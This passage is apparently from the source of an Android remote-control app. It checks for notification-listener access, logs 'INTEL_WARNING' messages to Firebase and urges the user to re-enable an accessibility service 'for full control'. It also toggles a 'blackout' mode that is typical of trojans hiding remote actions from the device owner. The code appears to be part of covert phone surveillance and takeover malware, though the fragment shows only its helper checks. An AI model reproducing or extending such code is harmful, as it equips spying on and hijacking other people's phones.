        }
        return getLocalIpAddress();
    }

    private boolean isIPv6(String ip) { return ip != null && ip.contains(":"); }

    private boolean isNotificationServiceEnabled() {
        String pkgName = getPackageName();
        final String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        if (flat != null && !flat.isEmpty()) {
            final String[] names = flat.split(":");
            for (String name : names) {
                final ComponentName cn = ComponentName.unflattenFromString(name);
                if (cn != null && pkgName.equals(cn.getPackageName())) return true;
            }
        }
        return false;
    }

    private void checkNotificationAccess() {
        if (!isNotificationServiceEnabled()) {
            if (isServerRunning()) FirebaseConfig.logActivity("INTEL_WARNING: Notification access not granted");
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        updateUI();
        checkNotificationAccess();
        
        // Monitoring: Accessibility Health
        if (IO_Persistence_Manager.getInstance() == null) {
            tvTerminalFeedback.setText("SECURITY_ALERT: Accessibility service disabled. Please re-enable for full control.");
            tvTerminalFeedback.setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_light));
        }

        // Anti-Blackout Safety
        if (IO_Persistence_Manager.getInstance() != null) {
            IO_Persistence_Manager.getInstance().startBlackout(false);
        }
    }
}
